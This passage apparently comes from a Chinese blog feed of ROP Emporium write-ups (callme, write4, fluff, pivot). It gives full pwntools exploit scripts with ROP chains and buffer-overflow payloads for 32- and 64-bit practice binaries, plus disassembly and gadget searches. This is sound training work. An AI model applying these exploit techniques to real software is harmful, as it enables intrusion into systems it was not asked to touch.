arg1+arg2+arg3</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>执行结果如下：</p>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20230313201914238.png" alt="image-20230313201914238"></p>
<h3 id="解法2：构造二次溢出"><a href="#解法2：构造二次溢出" class="headerlink" title="解法2：构造二次溢出"></a>解法2：构造二次溢出</h3><p>这个解法是当时没搞明白怎么连续调用libc函数的时候想的办法，既然一次不能调用多个函数，那就进行多次调用，每次调用一个函数。</p>
<p>思路：在预留返回地址处，将其覆盖为存在缓冲区漏洞的<code>pwnme</code>函数的地址，这样等到程序返回时会再次执行<code>pwnme</code>函数，我们再重新发送一次payload来调用其余的函数，重复直到三个<code>callme</code>函数全部调用完。</p>
<p>完整的expploit代码如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./callme32&#x27;</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./callme32&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pwnme_addr = p32(e.symbols[<span class="string">&quot;pwnme&quot;</span>])</span><br><span class="line">callme_one = p32(e.plt[<span class="string">&quot;callme_one&quot;</span>])</span><br><span class="line">callme_two = p32(e.plt[<span class="string">&quot;callme_two&quot;</span>])</span><br><span class="line">callme_three = p32(e.plt[<span class="string">&quot;callme_three&quot;</span>])</span><br><span class="line"></span><br><span class="line">arg1 = p32(<span class="number">0xdeadbeef</span>)</span><br><span class="line">arg2 = p32(<span class="number">0xcafebabe</span>)</span><br><span class="line">arg3 = p32(<span class="number">0xd00df00d</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># print(pwnme_addr)</span></span><br><span class="line"></span><br><span class="line">offset = <span class="number">44</span></span><br><span class="line"></span><br><span class="line">payload1 = offset*<span class="string">b&#x27;A&#x27;</span> + callme_one + pwnme_addr + arg1 + arg2 + arg3 </span><br><span class="line"></span><br><span class="line">p.sendline(payload1)</span><br><span class="line">payload2 = offset*<span class="string">b&#x27;A&#x27;</span> + callme_two + pwnme_addr + arg1 +arg2 +arg3 </span><br><span class="line">p.sendline(payload2)</span><br><span class="line">payload3 = offset*<span class="string">b&#x27;A&#x27;</span> + callme_three + p32(<span class="number">1</span>) + arg1 +arg2 +arg3 </span><br><span class="line">p.sendline(payload3)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>执行结果如下：</p>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20230313202037300.png" alt="image-20230313202037300"></p>
<p><strong>注意：</strong>这种构造二次溢出的方法，并不是通解，有时会受到一些限制，比如会漏掉一些堆栈平衡的操作导致偏移量变化。要根据实际情况来使用，可以当作一种拓展思路。</p>
<h2 id="x64"><a href="#x64" class="headerlink" title="x64"></a>x64</h2><p>64位道理相同，但是由于参数传递方式发生变化，前6个参数通过寄存器传递，消去参数比较容易理解，即调用<code>pop3 ret</code>重新给寄存器赋值，覆盖掉上边的值就可。</p>
<p>完整的exploit代码如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./callme&#x27;</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./callme&#x27;</span>)</span><br><span class="line"></span><br><span class="line">callme_one = p64(e.plt[<span class="string">&quot;callme_one&quot;</span>])</span><br><span class="line">callme_two = p64(e.plt[<span class="string">&quot;callme_two&quot;</span>])</span><br><span class="line">callme_three = p64(e.plt[<span class="string">&quot;callme_three&quot;</span>])</span><br><span class="line"></span><br><span class="line">pop_rdi_rsi_rdx_ret = p64(<span class="number">0x000000000040093c</span>)</span><br><span class="line"></span><br><span class="line">arg1 = p64(<span class="number">0xdeadbeefdeadbeef</span>)</span><br><span class="line">arg2 = p64(<span class="number">0xcafebabecafebabe</span>)</span><br><span class="line">arg3 = p64(<span class="number">0xd00df00dd00df00d</span>)</span><br><span class="line"></span><br><span class="line">offset = <span class="number">40</span></span><br><span class="line"></span><br><span class="line">payload = offset*<span class="string">b&#x27;A&#x27;</span></span><br><span class="line">payload+= pop_rdi_rsi_rdx_ret</span><br><span class="line">payload+= arg1 + arg2 + arg3</span><br><span class="line">payload+= callme_one</span><br><span class="line"></span><br><span class="line">payload+= pop_rdi_rsi_rdx_ret</span><br><span class="line">payload+= arg1 + arg2 + arg3</span><br><span class="line">payload+= callme_two</span><br><span class="line"></span><br><span class="line">payload+= pop_rdi_rsi_rdx_ret</span><br><span class="line">payload+= arg1 + arg2 + arg3</span><br><span class="line">payload+= callme_three</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>



<h3 id="解法2：构造二次溢出-1"><a href="#解法2：构造二次溢出-1" class="headerlink" title="解法2：构造二次溢出"></a>解法2：构造二次溢出</h3><p>同样，也可以通过构造二次溢出的方法解决</p>
<p>完整的exploit代码如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./callme&#x27;</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./callme&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pwnme_addr = p64(e.symbols[<span class="string">&quot;pwnme&quot;</span>])</span><br><span class="line">callme_one = p64(e.plt[<span class="string">&quot;callme_one&quot;</span>])</span><br><span class="line">callme_two = p64(e.plt[<span class="string">&quot;callme_two&quot;</span>])</span><br><span class="line">callme_three = p64(e.plt[<span class="string">&quot;callme_three&quot;</span>])</span><br><span class="line"></span><br><span class="line">pop_rdi_rsi_rdx_ret = p64(<span class="number">0x000000000040093c</span>)</span><br><span class="line"></span><br><span class="line">arg1 = p64(<span class="number">0xdeadbeefdeadbeef</span>)</span><br><span class="line">arg2 = p64(<span class="number">0xcafebabecafebabe</span>)</span><br><span class="line">arg3 = p64(<span class="number">0xd00df00dd00df00d</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">offset = <span class="number">40</span></span><br><span class="line"></span><br><span class="line">payload1 = offset*<span class="string">b&#x27;A&#x27;</span> + pop_rdi_rsi_rdx_ret + arg1 + arg2 + arg3 + callme_one + pwnme_addr  </span><br><span class="line"></span><br><span class="line">p.sendline(payload1)</span><br><span class="line">payload2 = offset*<span class="string">b&#x27;A&#x27;</span> + pop_rdi_rsi_rdx_ret + arg1 + arg2 + arg3 + callme_two + pwnme_addr </span><br><span class="line">p.sendline(payload2)</span><br><span class="line">payload3 = offset*<span class="string">b&#x27;A&#x27;</span> + pop_rdi_rsi_rdx_ret + arg1 + arg2 + arg3 + callme_three + pwnme_addr  </span><br><span class="line">p.sendline(payload3)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>ROP_Emporium</category>
      </categories>
      <tags>
        <tag>writeup</tag>
      </tags>
  </entry>
  <entry>
    <title>Challenge4_write4</title>
    <url>/2023/03/15/ROP_Emporium/Challenge4-write4/</url>
    <content><![CDATA[<h1 id="write4"><a href="#write4" class="headerlink" title="write4"></a>write4</h1><p>题目链接：<a href="https://ropemporium.com/challenge/write4.html">https://ropemporium.com/challenge/write4.html</a></p>
<h2 id="x86"><a href="#x86" class="headerlink" title="x86"></a>x86</h2><p>根据题目的提示可知，在本题程序中并没有存在levle2中的字符串，但是题目给了一个重要的信息，就是链接库中存在一个<code>print_file</code>函数，只需要将你希望读取的文件名（如：“flag.txt”）作为第一个参数调用即可。结合后续的提示，我们可以得到如下思路：</p>
<span id="more"></span>

<p>将字符串<code>flag.txt</code>从栈上写入到数据段，然后调用<code>print_file</code>函数，并将字符串作为参数传递。如果直接写在栈上，这样就引入了一个难题，我们需要额外在获取栈的地址，所以我们选择写入到数据段，根据<code>readelf</code>可以看到.data有rw权限。</p>
<p>首先还是按流程，先检查下程序保护情况：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">checksec ./write432</span> </span><br><span class="line">[*] &#x27;/home/giantbranch/Desktop/rop_emporium_all_challenges/level4_write4/32/write432&#x27;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line">    RUNPATH:  &#x27;.&#x27;</span><br></pre></td></tr></table></figure>

<p>因为有链接库，根据之前的经验，我们直接查看程序中的导入的链接库中的函数：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">rabin2 -i write432</span> </span><br><span class="line">[Imports]</span><br><span class="line">nth vaddr      bind   type   lib name</span><br><span class="line">―――――――――――――――――――――――――――――――――――――</span><br><span class="line">1   0x080483b0 GLOBAL FUNC       pwnme</span><br><span class="line">2   0x000003e0 WEAK   NOTYPE     __gmon_start__</span><br><span class="line">3   0x080483c0 GLOBAL FUNC       __libc_start_main</span><br><span class="line">4   0x080483d0 GLOBAL FUNC       print_file</span><br></pre></td></tr></table></figure>

<p>可以看到，·<code>pwnme</code>和<code>print_file</code>函数均在库函数中，我们加载分析链接库，具体看一下这两个函数：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">$ r2 -A ./libwrite432.so </span><br><span class="line">[<span class="number">0x000005a0</span>]&gt; s sym.pwnme </span><br><span class="line">[<span class="number">0x0000069d</span>]&gt; pdg</span><br><span class="line"></span><br><span class="line"><span class="comment">// WARNING: Variable defined which should be unmapped: var_4h</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> sym.pwnme(<span class="type">void</span>)</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int32_t</span> unaff_EBX;</span><br><span class="line">    uint s;</span><br><span class="line">    uint var_4h;</span><br><span class="line">    </span><br><span class="line">    entry0();</span><br><span class="line">    sym.imp.setvbuf(**(unaff_EBX + <span class="number">0x194f</span>), <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">    sym.imp.<span class="built_in">puts</span>(unaff_EBX + <span class="number">0x14f</span>);</span><br><span class="line">    sym.imp.<span class="built_in">puts</span>(unaff_EBX + <span class="number">0x166</span>);</span><br><span class="line">    sym.imp.<span class="built_in">memset</span>(&amp;s, <span class="number">0</span>, <span class="number">0x20</span>);</span><br><span class="line">    sym.imp.<span class="built_in">puts</span>(unaff_EBX + <span class="number">0x16b</span>);</span><br><span class="line">    sym.imp.<span class="built_in">printf</span>(unaff_EBX + <span class="number">0x194</span>);</span><br><span class="line">    sym.imp.read(<span class="number">0</span>, &amp;s, <span class="number">0x200</span>);</span><br><span class="line">    sym.imp.<span class="built_in">puts</span>(unaff_EBX + <span class="number">0x197</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>同样，<code>read</code>函数处存在栈溢出漏洞</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">[<span class="number">0x0000069d</span>]&gt; s sym.print_file </span><br><span class="line">[<span class="number">0x0000074f</span>]&gt; pdg</span><br><span class="line"></span><br><span class="line"><span class="comment">// WARNING: Variable defined which should be unmapped: var_4h</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> sym.print_file(<span class="type">int32_t</span> filename)</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int32_t</span> unaff_EBX;</span><br><span class="line">    <span class="type">int32_t</span> *piVar1;</span><br><span class="line">    <span class="type">int32_t</span> iStack76;</span><br><span class="line">    <span class="type">int32_t</span> iStack72;</span><br><span class="line">    uint uStack64;</span><br><span class="line">    uchar auStack60 [<span class="number">11</span>];</span><br><span class="line">    uint s;</span><br><span class="line">    <span class="type">int32_t</span> stream;</span><br><span class="line">    uint var_4h;</span><br><span class="line">    </span><br><span class="line">    piVar1 = auStack60;</span><br><span class="line">    uStack64 = <span class="number">0x75b</span>;</span><br><span class="line">    entry0();</span><br><span class="line">    stream = <span class="number">0</span>;</span><br><span class="line">    iStack72 = unaff_EBX + <span class="number">0xf0</span>;</span><br><span class="line">    iStack76 = filename;</span><br><span class="line">    stream = sym.imp.fopen();</span><br><span class="line">    <span class="keyword">if</span> (stream == <span class="number">0</span>) &#123;</span><br><span class="line">        iStack72 = filename;</span><br><span class="line">        iStack76 = unaff_EBX + <span class="number">0xf2</span>;</span><br><span class="line">        piVar1 = &amp;iStack76;</span><br><span class="line">        sym.imp.<span class="built_in">printf</span>();</span><br><span class="line">        iStack76 = <span class="number">1</span>;</span><br><span class="line">        sym.imp.<span class="built_in">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    *(piVar1 + <span class="number">-8</span>) = stream;</span><br><span class="line">    *(piVar1 + <span class="number">-0xc</span>) = <span class="number">0x21</span>;</span><br><span class="line">    *(piVar1 + <span class="number">-0x10</span>) = &amp;s;</span><br><span class="line">    *(piVar1 + <span class="number">-0x14</span>) = <span class="number">0x7b6</span>;</span><br><span class="line">    sym.imp.fgets();</span><br><span class="line">    *(piVar1 + <span class="number">-0x10</span>) = &amp;s;</span><br><span class="line">    *(piVar1 + <span class="number">-0x14</span>) = <span class="number">0x7c5</span>;</span><br><span class="line">    sym.imp.<span class="built_in">puts</span>();</span><br><span class="line">    *(piVar1 + <span class="number">-0x10</span>) = stream;</span><br><span class="line">    *(piVar1 + <span class="number">-0x14</span>) = <span class="number">0x7d3</span>;</span><br><span class="line">    sym.imp.fclose();</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里不得不说一句，还是用IDA反编译看起来比较舒服，这里就当是联系其他的工具吧，技多不压身。</p>
<p>接着我们在看下程序中的函数有哪些：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">r2 -A ./write432</span></span><br><span class="line"><span class="meta prompt_">[0x080483f0]&gt; </span><span class="language-bash">afl</span></span><br><span class="line">0x080483f0    1     50 entry0</span><br><span class="line">0x08048423    1      4 fcn.08048423</span><br><span class="line">0x080483c0    1      6 sym.imp.__libc_start_main</span><br><span class="line">0x0804837c    3     35 sym._init</span><br><span class="line">0x08048440    1      4 sym.__x86.get_pc_thunk.bx</span><br><span class="line">0x080483e0    1      6 sym..plt.got</span><br><span class="line">0x080485b4    1     20 sym._fini</span><br><span class="line">0x08048450    4     41 sym.deregister_tm_clones</span><br><span class="line">0x08048490    4     54 sym.register_tm_clones</span><br><span class="line">0x080484d0    3     31 sym.__do_global_dtors_aux</span><br><span class="line">0x08048500    1      6 sym.frame_dummy</span><br><span class="line">0x0804852a    1     25 sym.usefulFunction</span><br><span class="line">0x080483d0    1      6 sym.imp.print_file</span><br><span class="line">0x080485b0    1      2 sym.__libc_csu_fini</span><br><span class="line">0x08048550    4     93 sym.__libc_csu_init</span><br><span class="line">0x08048430    1      2 sym._dl_relocate_static_pie</span><br><span class="line">0x08048506    1     36 main</span><br><span class="line">0x080483b0    1      6 sym.imp.pwnme</span><br></pre></td></tr></table></figure>

<p>从这里我们可以看到几个有用的函数<code>usefulFunction</code>、<code>imp.print_file</code>、<code>imp.pwnme</code>，后两个我们已经在链接库中看过了，我们再来看下第一个函数：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">[<span class="number">0x080483f0</span>]&gt; s sym.usefulFunction </span><br><span class="line">[<span class="number">0x0804852a</span>]&gt; pdg</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> sym.usefulFunction(<span class="type">void</span>)</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    sym.imp.print_file(<span class="string">&quot;nonexistent&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>该函数的作用就是调用<code>print_file</code>，emm，怎么说，也没有那么的usefull😂</p>
<p>其实，这里如果我们用<code>pwndbg</code>来查看函数信息，会有不一样的发现，（在IDA中也能发现）：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">info <span class="keyword">function</span></span></span><br><span class="line">All defined functions:</span><br><span class="line"></span><br><span class="line">Non-debugging symbols:</span><br><span class="line">0x0804837c  _init</span><br><span class="line">0x080483b0  pwnme@plt</span><br><span class="line">0x080483c0  __libc_start_main@plt</span><br><span class="line">0x080483d0  print_file@plt</span><br><span class="line">0x080483f0  _start</span><br><span class="line">0x08048430  _dl_relocate_static_pie</span><br><span class="line">0x08048440  __x86.get_pc_thunk.bx</span><br><span class="line">0x08048450  deregister_tm_clones</span><br><span class="line">0x08048490  register_tm_clones</span><br><span class="line">0x080484d0  __do_global_dtors_aux</span><br><span class="line">0x08048500  frame_dummy</span><br><span class="line">0x08048506  main</span><br><span class="line">0x0804852a  usefulFunction</span><br><span class="line">0x08048543  usefulGadgets</span><br><span class="line">0x08048550  __libc_csu_init</span><br><span class="line">0x080485b0  __libc_csu_fini</span><br><span class="line">0x080485b4  _fini</span><br></pre></td></tr></table></figure>

<p>我们可以看到，在<code>0x08048543</code>地址处，有一个叫<code>usefulGadgets</code>的函数，从名字上来看，它能够给我们提供一些有用的gadgets，我们反汇编查看一下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">disass usefulGadgets</span> </span><br><span class="line">Dump of assembler code for function usefulGadgets:</span><br><span class="line">   0x08048543 &lt;+0&gt;:	mov    DWORD PTR [edi],ebp</span><br><span class="line">   0x08048545 &lt;+2&gt;:	ret    </span><br><span class="line">   0x08048546 &lt;+3&gt;:	xchg   ax,ax</span><br><span class="line">   0x08048548 &lt;+5&gt;:	xchg   ax,ax</span><br><span class="line">   0x0804854a &lt;+7&gt;:	xchg   ax,ax</span><br><span class="line">   0x0804854c &lt;+9&gt;:	xchg   ax,ax</span><br><span class="line">   0x0804854e &lt;+11&gt;:	xchg   ax,ax</span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure>

<p><code>mov DWORD PTR [edi],ebp</code>是一个很有用的gadgets，它将<code>ebp</code>寄存器的内容移动到地址为（<code>edi</code>寄存器的内容）的地址处，如果我们能把<code>ebp</code>的值设置为<code>rw</code>区域的地址，那么我们就能把<code>ebp</code>里的内容写入到上边。</p>
<p>顺着这个思路，我们就需要找到对<code>edi</code>，<code>ebp</code>操作的gadgets</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; rop --grep &quot;pop edi&quot;</span><br><span class="line">0x080485a5 : add esp, 0xc ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret</span><br><span class="line">0x080485a4 : jecxz 0x8048531 ; les ecx, ptr [ebx + ebx*2] ; pop esi ; pop edi ; pop ebp ; ret</span><br><span class="line">0x080485a3 : jne 0x8048591 ; add esp, 0xc ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret</span><br><span class="line">0x080485a6 : les ecx, ptr [ebx + ebx*2] ; pop esi ; pop edi ; pop ebp ; ret</span><br><span class="line">0x080485a7 : or al, 0x5b ; pop esi ; pop edi ; pop ebp ; ret</span><br><span class="line">0x080485a8 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret</span><br><span class="line">0x080485aa : pop edi ; pop ebp ; ret</span><br><span class="line">0x080485a9 : pop esi ; pop edi ; pop ebp ; ret</span><br></pre></td></tr></table></figure>

<p><code>0x080485aa</code>处的gadget刚好满足我们的两个要求</p>
<p>接着，我们查找下数据段地址：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">readelf -S write432</span></span><br><span class="line"> ...</span><br><span class="line"> [24] .data             PROGBITS        0804a018 001018 000008 00  WA  0   0  4</span><br><span class="line"> ...</span><br></pre></td></tr></table></figure>

<p><code>0x0804a018</code>就是数据段的起始地址，我们可以构建ROP链了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">padding					#padding</span><br><span class="line">pop edi; pop ebp; ret	#覆盖原来的返回地址，设置寄存器的值</span><br><span class="line">data addr + &#x27;flag&#x27;		#数据段地址 和 参数‘flag’</span><br><span class="line">mov [edi],ebp; ret		#将参数从寄存器转移到数据段</span><br><span class="line">pop edi; pop ebp; ret	#设置寄存器的值</span><br><span class="line">data addr+4 + &#x27;.txt&#x27;	#数据段地址 和 参数&#x27;.txt&#x27;</span><br><span class="line">mov [edi],ebp; ret		#将参数从寄存器转移到数据段</span><br><span class="line">print_file addr			#print_file函数地址</span><br><span class="line">fake_return addr		#预留返回地址</span><br><span class="line">data addr				#参数flag.txt在数据段中的地址</span><br></pre></td></tr></table></figure>

<p>完整的exploit代码如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./write432&#x27;</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./write432&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">print_addr = p32(e.plt[<span class="string">&quot;print_file&quot;</span>]) <span class="comment">#80483d0</span></span><br><span class="line"></span><br><span class="line">flag_addr = p32(<span class="number">0x0804a018</span>) <span class="comment">#.data section</span></span><br><span class="line">flag_addr2= p32(<span class="number">0x0804a018</span> + <span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">pop_edi_ebp_addr =  p32(<span class="number">0x080485aa</span>) <span class="comment"># pop edi;pop ebp ;ret</span></span><br><span class="line"></span><br><span class="line">mov_data_addr = p32(<span class="number">0x08048543</span>) <span class="comment"># mov dword ptr [edi], ebp ; ret</span></span><br><span class="line"></span><br><span class="line">offset = <span class="number">44</span></span><br><span class="line"></span><br><span class="line">payload = offset*<span class="string">b&#x27;A&#x27;</span></span><br><span class="line">payload+= pop_edi_ebp_addr + flag_addr + <span class="string">b&#x27;flag&#x27;</span> </span><br><span class="line">payload+= mov_data_addr</span><br><span class="line">payload+= pop_edi_ebp_addr + flag_addr2 + <span class="string">b&#x27;.txt&#x27;</span></span><br><span class="line">payload+= mov_data_addr</span><br><span class="line">payload+= print_addr</span><br><span class="line">payload+= p32(<span class="number">1</span>)</span><br><span class="line">payload+= flag_addr</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>执行结果如下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">write4 by ROP Emporium</span><br><span class="line">x86</span><br><span class="line"></span><br><span class="line">Go ahead and give me the input already!</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">Thank you!</span></span><br><span class="line">ROPE&#123;a_placeholder_32byte_flag!&#125;</span><br><span class="line">[*] Got EOF while reading in interactive</span><br><span class="line"><span class="meta prompt_">$ </span></span><br></pre></td></tr></table></figure>



<h2 id="x64"><a href="#x64" class="headerlink" title="x64"></a>x64</h2><p>64位与32位思路相同，需要多找一个传递函数参数的gadgets。</p>
<p>完整的exploit代码如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./write4&#x27;</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./write4&#x27;</span>)</span><br><span class="line"></span><br><span class="line">print_addr = p64(e.plt[<span class="string">&quot;print_file&quot;</span>])</span><br><span class="line"></span><br><span class="line">flag_addr = p64(<span class="number">0x0000000000601028</span>)</span><br><span class="line"></span><br><span class="line">pop_data = p64(<span class="number">0x0000000000400690</span>) <span class="comment">#: pop r14 ; pop r15 ; ret</span></span><br><span class="line">mov_data =  p64(<span class="number">0x0000000000400628</span>)<span class="comment"># : mov qword ptr [r14], r15 ; ret</span></span><br><span class="line">pop_rdi = p64(<span class="number">0x0000000000400693</span>) <span class="comment">#: pop rdi ; ret</span></span><br><span class="line"></span><br><span class="line">offset = <span class="number">40</span></span><br><span class="line"></span><br><span class="line">payload = offset*<span class="string">b&#x27;A&#x27;</span></span><br><span class="line">payload+= pop_data +flag_addr+<span class="string">b&#x27;flag.txt&#x27;</span></span><br><span class="line">payload+= mov_data</span><br><span class="line">payload+= pop_rdi + flag_addr</span><br><span class="line">payload+= print_addr</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>执行结果如下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">write4 by ROP Emporium</span><br><span class="line">x86_64</span><br><span class="line"></span><br><span class="line">Go ahead and give me the input already!</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">Thank you!</span></span><br><span class="line">ROPE&#123;a_placeholder_32byte_flag!&#125;</span><br><span class="line">[*] Got EOF while reading in interactive</span><br><span class="line"><span class="meta prompt_">$ </span></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>ROP_Emporium</category>
      </categories>
      <tags>
        <tag>writeup</tag>
      </tags>
  </entry>
  <entry>
    <title>Challenge6_fluff</title>
    <url>/2023/03/15/ROP_Emporium/Challenge6-fluff/</url>
    <content><![CDATA[<h1 id="fluff"><a href="#fluff" class="headerlink" title="fluff"></a>fluff</h1><p>思路不难想，跟write4一样的思路，只是构造ROP链时，需要用到一些偏僻的汇编指令，构造起来比较麻烦。</p>
<p>详细过程请参考这篇博客：<a href="https://bbs.kanxue.com/thread-272054.htm">https://bbs.kanxue.com/thread-272054.htm</a></p>
<span id="more"></span>

<p>其中涉及的一些汇编指令：</p>
<h2 id="XCHG"><a href="#XCHG" class="headerlink" title="XCHG"></a><code>XCHG</code></h2><p><code>xchg</code>指令的功能是交换两个数据的内容，指令格式如下：</p>
<ol>
<li><code>xchg reg,reg</code></li>
<li><code>xchg reg,mem</code></li>
<li><code>xchg mem,reg</code></li>
</ol>
<p>示例：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xhcg ax,bx  ;交换16位寄存器的值</span><br><span class="line">xchg ah,al  ;交换8位寄存器的内容</span><br><span class="line">xchg var1,bx;交换16位内存操作数和BX寄存器的内容</span><br><span class="line">xchg eax,ebx;交换32位寄存器内容</span><br></pre></td></tr></table></figure>



<h2 id="BSWAP"><a href="#BSWAP" class="headerlink" title="BSWAP"></a><code>BSWAP</code></h2><p><code>bswap</code>指令的功能是以字节为单位，把寄存器的内的字节次序变反。</p>
<p>比如：(EAX)&#x3D;<strong>9668 8368</strong>H，执行指令：</p>
<p>BSWAP EAX ，则(EAX)&#x3D;<strong>6883 6896</strong>H。</p>
<h2 id="PEXT"><a href="#PEXT" class="headerlink" title="PEXT"></a><code>PEXT</code></h2><p><code>pext</code>指令使用第二个源操作数（第三个操作数）中的掩码，将第一个源操作数（第二个操作数）中的连续或不连续的位转移到目的地（第一个操作数）中的连续低阶位。对于MASK中设置的每一个位，PEXT从第一个源操作数中提取相应的位，并把它们写到目的操作数的连续低位中。目的地的剩余高位被清零。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pext output(edx), source(ebx), mask(eax)</span><br><span class="line">output = pext(source, mask)</span><br><span class="line">ebx = 0xFFFFFFFF</span><br><span class="line">eax = b1111 0100</span><br><span class="line">-&gt;</span><br><span class="line">edx = 0x1F</span><br></pre></td></tr></table></figure>

<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20230306095254592.png" alt="image-20230306095254592"></p>
]]></content>
      <categories>
        <category>ROP_Emporium</category>
      </categories>
      <tags>
        <tag>writeup</tag>
      </tags>
  </entry>
  <entry>
    <title>Challenge7_pivot</title>
    <url>/2023/03/15/ROP_Emporium/Challenge7_pivot/</url>
    <content><![CDATA[<h1 id="pivot-栈迁移"><a href="#pivot-栈迁移" class="headerlink" title="pivot(栈迁移)"></a>pivot(栈迁移)</h1><p>题目链接：<a href="https://ropemporium.com/challenge/pivot.html">https://ropemporium.com/challenge/pivot.html</a></p>
<h2 id="x86"><a href="#x86" class="headerlink" title="x86"></a>x86</h2><p>根据题目提示，我们需要进行栈迁移，因为留给我们的溢出长度太短了，不足以存放一个完整的ROP链。同时，题目还提示我们，程序中导入了链接库<code>libpivot32.so </code> 中的<code>foodhold_function</code>函数，并且<code>ret2win</code>函数也被包含在链接库中。根据前几个挑战的经验和题目的提示，我们可以猜到，需要用到ret2libc技术，调用链接库中的<code>ret2win</code>函数，拿到flag。</p>
<p><strong>Note：</strong>有关栈迁移技术和ret2libc技术的介绍请查看PWN入门中的相关讲解，此处默认已经了解这两种技术。</p>
<span id="more"></span>

<p>首先，照例看下程序的保护情况：</p>
